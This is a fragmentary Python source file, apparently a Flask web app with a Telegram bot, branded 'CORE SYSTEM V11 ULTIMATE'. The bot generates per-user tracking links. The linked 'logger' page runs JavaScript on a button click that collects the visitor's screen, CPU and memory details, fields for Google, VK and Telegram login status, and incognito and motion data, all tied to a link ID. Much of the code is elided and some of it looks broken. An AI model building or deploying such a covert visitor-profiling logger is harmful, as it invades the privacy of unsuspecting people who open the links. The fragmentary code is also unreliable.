...
# Файл должен лежать в корне гитхаба
...
def home():
    ...
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;text-align:center;">
        <h1 style="margin-bottom:20px;">⚡ CORE SYSTEM V11 ULTIMATE</h1>
...
def logger(uid):
    ...
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        ...
        btn.onclick = async () => {{
            ...
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A", hz: 60, bench: 0, gpu: "N/A" }},
                ...
                social: {{ g: "❌", vk: "❌", tg: "❌" }},
                bright: "Средняя", inc: "НЕТ", mot: "static"
            }};
...
def create(m):
    ...
    bot.reply_to(m, f"✅ *Ссылка готова:* https://{request.host}/v/{uid}")
